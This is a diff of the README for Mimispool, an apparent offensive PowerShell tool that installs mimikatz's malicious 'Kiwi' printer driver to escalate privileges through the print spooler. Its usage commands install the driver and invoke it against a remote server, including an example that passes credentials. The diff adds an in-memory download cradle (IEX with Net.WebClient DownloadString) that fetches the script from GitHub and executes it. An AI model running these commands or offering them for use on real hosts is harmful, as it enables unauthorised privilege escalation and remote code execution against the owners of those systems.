@@ -9,7 +9,11 @@ Requires admin privileges on the host you want to install the printer on.
 ### Import the Module
 
 ```powershell
+# Locally
 . .\Mimispool.ps1
+
+# Remotely
+IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/xbufu/Mimispool/main/Mimispool.ps1")
 ```
 
 ### Install Printer
@@ -18,8 +22,8 @@ Requires admin privileges on the host you want to install the printer on.
 # With internet access
 Install-KiwiPrinter
 
-# Without internet access by specifying path to local mimikatz_trunk.zip file
-Install-KiwiPrinter -Archive ".\mimikatz_trunk.zip"
+# Without internet access by specifying path to local mimispool dlls (both required)
+Install-KiwiPrinter -DLL32 ".\mimispool32.dll" -DLL64 ".\mimispool64.dll"
 ```
 
 ### Uninstall Printer
@@ -37,5 +41,7 @@ Invoke-KiwiPrinter -Server "192.168.47.129"
 # With credentials
 Invoke-KiwiPrinter -Server "192.168.47.129" -Username "user" -Password "pass"
 ```
+
+## PoC
 
 ![Proof of Concept](img/poc.png)
